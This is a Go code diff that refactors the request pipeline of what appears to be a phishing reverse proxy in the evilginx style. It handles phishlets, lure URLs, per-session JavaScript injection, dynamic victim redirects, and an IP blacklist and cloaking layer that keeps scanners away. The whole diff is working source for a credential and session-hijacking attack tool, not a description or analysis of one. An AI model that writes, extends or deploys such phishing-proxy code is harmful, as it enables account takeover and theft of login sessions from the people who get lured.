@@ -297,131 +297,73 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
 
-			// handle ip blacklist
-			//
-			// Client-supplied proxy headers (X-Forwarded-For, etc.) are only
-			// honored when trustProxyHeaders is explicitly enabled (wired from
-			// -cloaker-trust-proxy-headers); otherwise req.RemoteAddr is the
-			// sole source of truth. Trusting these headers unconditionally
-			// lets any client spoof its way past rate limiting and
-			// blacklisting, and worse, lets it poison the persistent
-			// blacklist (below) with an arbitrary attacker-chosen address.
-			// asncloak.ResolveClientIP applies the exact same header
-			// precedence and trust gating the cloaker uses, so the two
-			// subsystems never disagree about who the client is.
-			from_ip := asncloak.ResolveClientIP(req, p.trustProxyHeaders)
-			if allowed, err := p.db.AllowRequest(from_ip, p.rateLimit, p.rateWindow); err != nil {
-				log.Error("rate limit: %v", err)
-			} else if !allowed {
-				log.Warning("rate limit: request from ip address '%s' was throttled", from_ip)
-				return req, goproxy.NewResponse(req, "text/plain", http.StatusTooManyRequests, "Too Many Requests")
+			// Access control runs before anything else in the request path.
+			// See enforceAccessControls in request_pipeline.go for the rate
+			// limit, the blacklist modes, and why the client address is
+			// resolved the way it is.
+			from_ip, denied := p.enforceAccessControls(req)
+			if denied != nil {
+				return req, denied
 			}
 
-			if p.cfg.GetBlacklistMode() != "off" {
-				if p.bl.IsBlacklisted(from_ip) {
-					if p.bl.IsVerbose() {
-						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
-					}
-					return p.blockRequest(req)
-				}
-				if p.cfg.GetBlacklistMode() == "all" {
-					if !p.bl.IsWhitelisted(from_ip) {
-						err := p.bl.AddIP(from_ip)
-						if p.bl.IsVerbose() {
-							if err != nil {
-								log.Error("blacklist: %s", err)
-							} else {
-								log.Warning("blacklisted ip address: %s", from_ip)
-							}
-						}
-					}
-
-					return p.blockRequest(req)
-				}
-			}
-
-			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
-			o_host := req.Host
-			lure_url := req_url
-			req_path := req.URL.Path
-			if req.URL.RawQuery != "" {
-				req_url += "?" + req.URL.RawQuery
-				//req_path += "?" + req.URL.RawQuery
-			}
+			targets := resolveRequestTargets(req)
+			req_url, o_host, lure_url, req_path := targets.URL, targets.Host, targets.LureURL, targets.Path
 
 			pl := p.getPhishletByPhishHost(req.Host)
 			remote_addr := from_ip
 
-			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
-			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")
+			if route, matched := parseSessionScriptRoute(req.URL.Path); matched {
+				// A path with the /s/<a>/<b> shape is never the single-segment
+				// redirect route, even when <b> is not a script: it falls
+				// through to ordinary proxying instead.
+				if route.ScriptID == "" {
+					// not a script request
+				} else if s, ok := p.getSession(route.SessionID); ok {
+					var d_body string
+					js_params := &s.Params
 
-			if js_inject_re.MatchString(req.URL.Path) {
-				ra := js_inject_re.FindStringSubmatch(req.URL.Path)
-				if len(ra) >= 3 {
-					session_id := ra[1]
-					js_id := ra[2]
-					if strings.HasSuffix(js_id, ".js") {
-						js_id = js_id[:len(js_id)-3]
-						if s, ok := p.getSession(session_id); ok {
-							var d_body string
-							var js_params *map[string]string = nil
-							js_params = &s.Params
-
-							script, err := pl.GetScriptInjectById(js_id, js_params)
-							if err == nil {
-								d_body += script + "\n\n"
-							} else {
-								log.Warning("js_inject: script not found: '%s'", js_id)
-							}
-							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
-							return req, resp
-						} else {
-							log.Warning("js_inject: session not found: '%s'", session_id)
-						}
-					}
-				}
-			} else if redir_re.MatchString(req.URL.Path) {
-				ra := redir_re.FindStringSubmatch(req.URL.Path)
-				if len(ra) >= 2 {
-					session_id := ra[1]
-					if strings.HasSuffix(session_id, ".js") {
-						// respond with injected javascript
-						session_id = session_id[:len(session_id)-3]
-						if s, ok := p.getSession(session_id); ok {
-							var d_body string
-							if !s.IsDone {
-								if s.RedirectURL != "" {
-									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
-									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
-									d_body += dynamic_redirect_js + "\n\n"
-								}
-							}
-							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
-							return req, resp
-						} else {
-							log.Warning("js: session not found: '%s'", session_id)
-						}
+					script, err := pl.GetScriptInjectById(route.ScriptID, js_params)
+					if err == nil {
+						d_body += script + "\n\n"
 					} else {
-						if p.hasSession(session_id) {
-							redirect_url, ok := p.waitForRedirectUrl(session_id)
-							if ok {
-								type ResponseRedirectUrl struct {
-									RedirectUrl string `json:"redirect_url"`
-								}
-								d_json, err := json.Marshal(&ResponseRedirectUrl{RedirectUrl: redirect_url})
-								if err == nil {
-									s_index, _ := p.getSessionIndex(session_id)
-									log.Important("[%d] dynamic redirect to URL: %s", s_index, redirect_url)
-									resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
-									return req, resp
-								}
-							}
-							resp := goproxy.NewResponse(req, "application/json", 408, "")
+						log.Warning("js_inject: script not found: '%s'", route.ScriptID)
+					}
+					resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
+					return req, resp
+				} else {
+					log.Warning("js_inject: session not found: '%s'", route.SessionID)
+				}
+			} else if route, matched := parseSessionRoute(req.URL.Path); matched {
+				if route.IsScript {
+					// respond with injected javascript
+					if s, ok := p.getSession(route.SessionID); ok {
+						var d_body string
+						if !s.IsDone && s.RedirectURL != "" {
+							dynamic_redirect_js := strings.ReplaceAll(DYNAMIC_REDIRECT_JS, "{session_id}", s.Id)
+							d_body += dynamic_redirect_js + "\n\n"
+						}
+						resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
+						return req, resp
+					}
+					log.Warning("js: session not found: '%s'", route.SessionID)
+				} else if p.hasSession(route.SessionID) {
+					redirect_url, ok := p.waitForRedirectUrl(route.SessionID)
+					if ok {
+						type ResponseRedirectUrl struct {
+							RedirectUrl string `json:"redirect_url"`
+						}
+						d_json, err := json.Marshal(&ResponseRedirectUrl{RedirectUrl: redirect_url})
+						if err == nil {
+							s_index, _ := p.getSessionIndex(route.SessionID)
+							log.Important("[%d] dynamic redirect to URL: %s", s_index, redirect_url)
+							resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
 							return req, resp
-						} else {
-							log.Warning("api: session not found: '%s'", session_id)
 						}
 					}
+					resp := goproxy.NewResponse(req, "application/json", 408, "")
+					return req, resp
+				} else {
+					log.Warning("api: session not found: '%s'", route.SessionID)
 				}
 			}
 
